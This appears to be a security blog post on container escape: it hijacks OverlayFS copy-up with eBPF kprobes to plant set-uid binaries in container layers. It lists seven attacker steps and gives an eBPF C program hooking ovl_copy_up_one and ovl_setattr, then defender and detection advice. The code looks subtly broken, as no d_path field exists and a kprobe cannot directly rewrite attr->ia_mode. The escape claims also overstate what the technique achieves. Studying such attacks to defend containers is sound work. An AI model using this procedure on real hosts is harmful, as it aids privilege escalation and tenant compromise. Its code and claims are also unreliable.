The OverlayFS Trojan Horse: Container Escape Through Layer Manipulation

Wut

Hijacking OverlayFS copy‑up events with eBPF to plant set‑uid payloads inside container layers without touching host storage. This technique allows attackers to escalate privileges within containers by intercepting and modifying file operations during the copy-up process.

graph TD
    A[Container Access] -->|1. Trigger Copy-up| B[OverlayFS]
    B -->|2. Intercept| C[eBPF Program]
    C -->|3. Modify| D[Set-uid Payload]
    D -->|4. Write| E[Container Layer]
    E -->|5. Execute| F[Privilege Escalation]

Why

Because eBPF + misconfiguration => broken isolation. OverlayFS is widely used in container environments to provide a unified view of multiple filesystem layers. When a file needs to be modified, it’s copied from a lower (read-only) layer to the upper (writable) layer—a process called “copy-up.” By intercepting this process with eBPF, attackers can modify files during transit, introducing malicious content without directly modifying the host filesystem.

Attacker hat on

  1. Identify a container using OverlayFS (most Docker/Kubernetes environments)
  2. Develop an eBPF program that hooks into OverlayFS copy-up functions
  3. Load the malicious BPF program with appropriate privileges
  4. Trigger file modifications within the container to initiate copy-up operations
  5. The eBPF program intercepts the operation and modifies the file, adding set-uid bits
  6. Execute the modified binary to escalate privileges
  7. Use elevated privileges to escape container isolation

Defender hat on

  1. Remove CAP_BPF from container environments
  2. Implement BPF LSM policies to restrict eBPF program loading
  3. Use read-only containers where possible
  4. Monitor for unexpected set-uid binaries in container layers
  5. Implement file integrity monitoring for critical container files
  6. Consider alternative container storage drivers if OverlayFS risks cannot be mitigated

Conclusion

eBPF is all you need. The ability to intercept and modify filesystem operations through eBPF provides attackers with powerful primitives to subvert container isolation. This technique highlights the importance of treating eBPF capabilities as privileged operations that should be tightly controlled, especially in multi-tenant environments.

Technical Details

OverlayFS Architecture

OverlayFS combines multiple filesystem layers into a single unified view. In container environments, this typically consists of:

  • Lower layers: Read-only filesystem layers containing the base container image
  • Upper layer: A writable layer where modifications are stored
  • Merged view: The unified filesystem presented to the container

When a file from a lower layer needs to be modified, OverlayFS performs a “copy-up” operation, copying the file to the upper layer before applying modifications.

Exploitation Technique

The exploit leverages eBPF’s ability to attach to kernel functions that handle OverlayFS operations. By intercepting these calls, an attacker can:

  1. Hook copy-up operations: Attach to functions like ovl_copy_up_one()
  2. Identify target files: Filter for specific files of interest (e.g., binaries)
  3. Modify file attributes: Set the set-uid bit during the copy-up process
  4. Inject malicious content: Alter file contents to include backdoors or exploits

// Simplified eBPF program to hook OverlayFS copy-up
SEC("kprobe/ovl_copy_up_one")
int BPF_KPROBE(hook_copy_up, struct dentry *dentry)
{
    struct path path;
    char filename[MAX_PATH_LEN];
    
    // Get the file path
    bpf_probe_read(&path, sizeof(path), &dentry->d_path);
    bpf_probe_read_str(filename, sizeof(filename), path.dentry->d_name.name);
    
    // Check if this is a target file
    if (bpf_strncmp(filename, "target_binary", sizeof("target_binary")) == 0) {
        // Set a flag to modify this file during copy-up
        // This would be implemented through a BPF map
        u32 key = 0;
        u32 value = 1;
        bpf_map_update_elem(&target_files, &key, &value, BPF_ANY);
    }
    
    return 0;
}

// Hook the function that sets file attributes after copy-up
SEC("kprobe/ovl_setattr")
int BPF_KPROBE(hook_setattr, struct dentry *dentry, struct iattr *attr)
{
    u32 key = 0;
    u32 *value;
    
    // Check if this is our target file
    value = bpf_map_lookup_elem(&target_files, &key);
    if (value && *value == 1) {
        // Set the setuid bit
        attr->ia_mode |= S_ISUID;
        // Clear our flag
        u32 zero = 0;
        bpf_map_update_elem(&target_files, &key, &zero, BPF_ANY);
    }
    
    return 0;
}

Detection Methods

Defenders should monitor for:

  • Unexpected eBPF programs attaching to OverlayFS-related functions
  • Unusual file permission changes during copy-up operations
  • New set-uid binaries appearing in container layers
  • Unexpected modifications to binaries in container environments

This technique demonstrates why proper eBPF restrictions are critical for maintaining container isolation, especially in multi-tenant environments where container breakout could lead to accessing other tenants’ data.

Real-world Impact

In practical environments, this technique could allow an attacker to:

  • Container escape: Gain root access on the host by exploiting the container boundary
  • Multi-tenant compromise: Access data from other containers sharing the same host
  • Persistent backdoors: Install difficult-to-detect backdoors that survive container restarts
  • Privilege escalation chains: Combine with other vulnerabilities to move laterally through a cluster
  • Supply chain attacks: Compromise build environments to inject malicious code into production images

The ability to silently modify files during copy-up operations creates a particularly concerning scenario for cloud environments and managed Kubernetes services where multiple customers share the same infrastructure.
